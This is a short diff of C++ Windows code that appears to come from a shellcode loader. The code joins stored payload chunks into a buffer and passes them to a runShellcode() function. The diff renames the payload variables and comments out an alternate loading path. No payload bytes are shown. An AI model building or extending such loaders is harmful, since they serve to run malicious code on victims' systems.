@@ -34,7 +34,7 @@
 #include <iostream>
 #include <Windows.h>
 #include <string>
-#include <vector>
+//#include <vector>
 #pragma warning(disable:4996)
 
 using namespace std;
@@ -69,7 +69,7 @@ public:
 			an alternate solution. Still in development, but the current working
 			solution is active in the getPayload() function.
 		*/
-
+		/*
 		ptr = new char[PayloadSize + 1]();
 		for (int i = 0; i < stringVec.size(); i++){
 			temp = stringVec[i].c_str();
@@ -77,6 +77,7 @@ public:
 		}
 		runShellcode(make_pair(ptr, PayloadSize));
 		free(ptr);
+		*/
 	}
 	void getPayload(int choice) {
 		/*
@@ -86,9 +87,9 @@ public:
 		*/
 		switch (choice) {
 		case 0:
-			ptr = new char[PAYLOADSize + 1]();
-			for (int i = 0; i < PAYLOADArrSize; i++){
-				temp = PAYLOADArr[i].c_str();
+			ptr = new char[PAYLOADNAMELen + 1]();
+			for (int i = 0; i < PAYLOADNAMEChunkCount; i++){
+				temp = PAYLOADNAMEArr[i]->c_str();
 				strcat(ptr, temp);
 			}
 			runShellcode(make_pair(ptr, PAYLOADSize));
